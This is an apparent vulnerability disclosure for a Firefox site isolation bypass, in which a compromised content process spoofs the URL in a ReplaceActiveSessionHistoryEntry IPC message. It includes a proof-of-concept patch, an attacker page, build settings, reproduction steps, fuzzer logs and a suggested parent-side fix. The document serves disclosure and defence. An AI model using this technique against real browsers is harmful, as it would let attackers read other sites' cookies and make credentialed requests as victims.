# Site Isolation Bypass in Firefox

A compromised content process can spoof the URL in a `ReplaceActiveSessionHistoryEntry` message to the parent process to create an origin confusion in the parent process, thus bypassing site isolation.

## Cause

The `ReplaceActiveSessionHistoryEntry` function offered by the `PContentParent` IPC interface allows the content process (`PContentChild`) to submit changes to the current history state. It is part of the implementation of the `history.replaceState(state, unused, url)` method of the browser API. For security reasons, `url` must be valid and same-origin to the current URL. However, this security check is only implemented in the content process. An attacker that has exploited a memory bug in the content process and has achieved RCE can send a malicious IPC message to the parent process, that contains a cross-site URL. This can be achieved by replacing `info->mURI` in `auto PContentChild::SendReplaceActiveSessionHistoryEntry(const MaybeDiscardedBrowsingContext& context, const SessionHistoryInfo& info) -> bool`  (in `release/ipc/ipdl/PContentChild.cpp`).
For the following explanation, the website used by the attacker will be `https://attacker.com` and the victim website will be `https://www.victim.com`.

The malicious `ReplaceActiveSessionHistoryEntry` IPC message is processed in `mozilla::ipc::IPCResult ContentParent::RecvReplaceActiveSessionHistoryEntry(const MaybeDiscarded<BrowsingContext>& aContext, SessionHistoryInfo&& aInfo)` in `dom/ipc/ContentParent.cpp`. There, the function `void CanonicalBrowsingContext::ReplaceActiveSessionHistoryEntry(SessionHistoryInfo* aInfo)` (`docshell/base/CanonicalBrowsingContext.cpp`) is called, which replaces the history state.

By sending a `ReplaceActiveSessionHistoryEntry` IPC message with the cross-site URL `https://victim.com` and subsequently calling `location.reload();` the attacker can trick the browser process to load the cross-site document in the current compromised content process associated with the site `https://attacker.com`, thus bypassing site isolation. The attacker still has RCE in the process because the process was not replaced. But the privileged parent process now assigns the site `https://victim.com` to the content process. Thus, the attacker can execute JS in the context of `victim.com` and for example read the cookies from and send credentialed fetch requests to `victim.com`.  We assume a compromised content process for this site isolation bypass, which we simulate by patching the content process code.

The function `SetActiveSessionHistoryEntry` probably also lacks security checks.

## Steps to reproduce (Firefox for Linux)

1. Patch the content process code to simulate the compromised renderer process
    - checkout and build a current version of Firefox (e.g., `c00a6f0cea53ee7b285abb8157f764cecc52dd28`)
    - must not be a debug build, because assertions in the content process detect the bug and crash the process
    - replace the method `PContentChild::SendReplaceActiveSessionHistoryEntry` in the generated `PContentChild.cpp` (`release/ipc/ipdl/PContentChild.cpp` if the attached mozconfig is used) as outlined in patch.txt or #renderer-patch below. The patch modifies the URL of the transmitted `SessionHistoryInfo`.
2. Start two HTTP servers, using 127.0.0.1 for the attacker and 127.0.0.2 for the victim
    - `cd attacker && python3 -m http.server --bind 127.0.0.1 8080` hosting attacker.html
    - `cd victim && python3 -m http.server --bind 127.0.0.2 8080` hosting victim.html
3. Browse the attacker website `./mach run http://127.0.0.1:8080/attacker.html` and observe the processes.
    - in `about:processes` we can observe the attacker process being reused for the victim site
    - observe that the title of the tab that the victim page is loaded in, still shows the URL of the attacker website

attacker/attacker.html:
```html
<!-- attacker page: http://127.0.0.1:8080/attacker.html --->
<html>
  <body>
    <h1>Attacker page</h1>

    <script>
      (async function () {
        await window.history.replaceState("foo", "bar", null);
        await window.location.reload();
      })();
    </script>
  </body>
</html>
```

victim/victim.html:
```html
<!-- victim page: http://127.0.0.2:8080/victim.html --->
<html>
  <body>
    <h1>Victim page</h1>
  </body>
</html>
```

### Renderer Patch

Replace a single function in the generated PContentChild.cpp:
```cpp
// release/ipc/ipdl/PContentChild.cpp

auto PContentChild::SendReplaceActiveSessionHistoryEntry(
        const MaybeDiscardedBrowsingContext& context,
        const SessionHistoryInfo& info) -> bool
{
    UniquePtr<IPC::Message> msg__ = PContent::Msg_ReplaceActiveSessionHistoryEntry(MSG_ROUTING_CONTROL);
    IPC::MessageWriter writer__{
            (*(msg__)),
            this};

    // PATCH
    SessionHistoryInfo newInfo(info);
    nsCOMPtr<nsIURI> uri;
    nsresult rv = NS_NewURI(getter_AddRefs(uri), "http://127.0.0.2:8080/victim.html"_ns);
    newInfo.SetURI(uri);

    IPC::WriteParam((&(writer__)), context);
    // Sentinel = 'context'
    ((&(writer__)))->WriteSentinel(199164678);
    IPC::WriteParam((&(writer__)), newInfo);
    // Sentinel = 'info'
    ((&(writer__)))->WriteSentinel(70058413);

    if (mozilla::ipc::LoggingEnabledFor("PContent", mozilla::ipc::ChildSide)) {
        mozilla::ipc::LogMessageForProtocol(
            "PContentChild",
            this->ToplevelProtocol()->OtherPidMaybeInvalid(),
            "Sending ",
            msg__->type(),
            mozilla::ipc::MessageDirection::eSending);
    }
    AUTO_PROFILER_LABEL("PContent::Msg_ReplaceActiveSessionHistoryEntry", OTHER);

    bool sendok__ = ChannelSend(std::move(msg__));
    return sendok__;
}
```

mozconfig:
```
export MOZ_PACKAGE_JSSHELL=1

ac_add_options --with-app-name=firefox
mk_add_options MOZ_APP_NAME=firefox
mk_add_options MOZ_OBJDIR=@TOPSRCDIR@/release

# Enable ASan specific code and build workarounds
ac_add_options --enable-address-sanitizer

# These three are required by ASan
ac_add_options --disable-jemalloc
ac_add_options --disable-crashreporter
ac_add_options --disable-elf-hack

# Keep symbols to symbolize ASan traces later
export MOZ_DEBUG_SYMBOLS=1
ac_add_options --enable-debug-symbols
ac_add_options --disable-install-strip

# Settings for an opt build (preferred)
# The -gline-tables-only ensures that all the necessary debug information for ASan
# is present, but the rest is stripped so the resulting binaries are smaller.
ac_add_options --enable-optimize="-O2 -gline-tables-only"
ac_add_options --disable-debug
```

## Affected Versions
Discovered in Firefox Linux Version 121. Reproduced in recent Linux build of bookmarks/central (`c00a6f0cea53ee7b285abb8157f764cecc52dd28`). We therefore assume, that all versions since 121 are impacted. Versions before 121 are probably also impacted. Reproduced on Debian Bookworm and Fedora 39 Workstation.
We did not test this on Windows, but since the function that misses a security check is in the part of the code that is not OS-specific, Firefox for Windows is probably also effected.

## Fix
The function `void CanonicalBrowsingContext::ReplaceActiveSessionHistoryEntry(SessionHistoryInfo* aInfo)` (`docshell/base/CanonicalBrowsingContext.cpp`) should include a security check, which verifies that `aInfo->mURI` is valid and same-origin to the current URL. A content process sending a message that fails this check is probably compromised and should be killed.+

# Appendix

- detectable by the leak sanitizer or the process sanitizer
- tested in Firefox 121 & 128 (gecko-dev master be29044bb9265c8e84bf67bf79f351998318e060)
    - reproducible in optimised builds with(-out) ASAN
    - not reproducible in debug builds, attacker renderer crashes

## Steps to reproduce using IPC fuzzer
- start servers: `ATTACKER=vulns/firefox_force_load/attacker VICTIM=vulns/firefox_force_load/victim tmuxp load server_session.yml`
- open seed page and attacker page (in [firefox directory](./firefox-ipc-fuzzing)): `MOZ_LOG="uxss_logger:5" ./mach run http://127.0.0.2:8080/seed http://127.0.0.1:8080/attacker.html`
    - delete profile before repeating: `rm -rf release/tmp/profile-default/`

logs:
```
[Child 1530782: Main Thread]: I/my_ipc_logger IPCFuzzer: ::mozilla::ipc::StandardURLParams spec, replaced url: http://127.0.0.2:8080/victim.html#32154352
[time: 1716296577380009][1530782->1530557] [PContentChild] Sending  PContent::Msg_ReplaceActiveSessionHistoryEntry
```

